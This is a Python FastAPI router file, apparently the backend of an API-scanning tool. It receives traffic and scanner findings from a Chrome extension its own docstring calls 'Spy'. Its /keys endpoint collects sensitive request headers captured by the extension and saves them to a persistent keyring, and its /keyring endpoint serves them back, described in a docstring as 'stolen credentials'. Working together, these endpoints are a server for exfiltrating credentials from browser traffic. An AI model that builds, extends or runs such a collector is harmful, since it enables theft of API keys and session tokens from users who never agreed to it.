from fastapi import APIRouter
from backend.schemas.payloads import ReconPayload
from backend.api.socket_manager import manager
from pydantic import BaseModel
from typing import Dict, Any
import os
import json

KEYRING_FILE = "keyring.json"

class KeyringPayload(BaseModel):
    url: str
    keys: Dict[str, str]
    timestamp: float

router = APIRouter()

@router.post("/ingest")
async def ingest_recon_data(payload: ReconPayload):
    """
    Receives traffic from the Chrome Extension (Spy).
    Passthrough to UI + Logic.
    """
    packet_data = payload.dict()
    
    # GAP FIX: Ingest V12 Scanner Findings into Kappa's Memory (The Brain)
    headers = packet_data.get("headers", {})
    if headers.get("x-scanner") == "v12-engine":
        try:
            # Extract findings from the payload
            # The extension sends the full result object in 'payload'
            scan_payload = packet_data.get("payload", {}) # This aligns with extension schema
            if "findings" in scan_payload:
                memory_file = "d:/Antigravity 2/API Endpoint Scanner/brain/memory.json"
                
                # Load existing brain
                brain_data = []
                if os.path.exists(memory_file):
                    with open(memory_file, "r") as f:
                        brain_data = json.load(f)
                
                # Append new findings as "Candidates" for Kappa to audit later
                for finding in scan_payload["findings"]:
                    candidate = {
                        "type": "VULN_CANDIDATE",
                        "description": finding.get("description"),
                        "payload": finding, # Full evidence
                        "source": "ScannerEngine V12",
                        "timestamp": packet_data.get("timestamp"),
                        "verified": False # Marks it for Kappa Audit
                    }
                    brain_data.append(candidate)
                
                # Write back
                with open(memory_file, "w") as f:
                    json.dump(brain_data, f, indent=2)
                    
                print(f"[RECON] 🧠 Ingested {len(scan_payload['findings'])} findings into Brain.")
        except Exception as e:
            print(f"[RECON] Brain Write Error: {e}")
    
    # Broadcast to UI
    await manager.broadcast({
        "type": "RECON_PACKET",
        "payload": packet_data
    })
    
@router.get("/keyring")
async def get_keyring():
    """
    Returns the persistent keyring (stolen credentials).
    """
    if not os.path.exists(KEYRING_FILE):
        return []
    try:
        with open(KEYRING_FILE, "r") as f:
            return json.load(f)
    except:
        return []

@router.post("/keys")
async def ingest_keys(payload: KeyringPayload):
    """
    Receives sensitive headers (keys) from the Chrome Extension.
    Stores them in a persistent keyring.
    """
    data = payload.dict()
    keyring = []
    
    if os.path.exists(KEYRING_FILE):
        try:
            with open(KEYRING_FILE, "r") as f:
                keyring = json.load(f)
        except:
            pass
            
    keyring.append(data)
    
    # Keep last 100 entries
    if len(keyring) > 100:
        keyring = keyring[-100:]
        
    try:
        with open(KEYRING_FILE, "w") as f:
            json.dump(keyring, f, indent=4)
    except:
        pass

    # Broadcast to UI
    await manager.broadcast({
        "type": "KEY_CAPTURE",
        "payload": data
    })
    
    return {"status": "archived"}
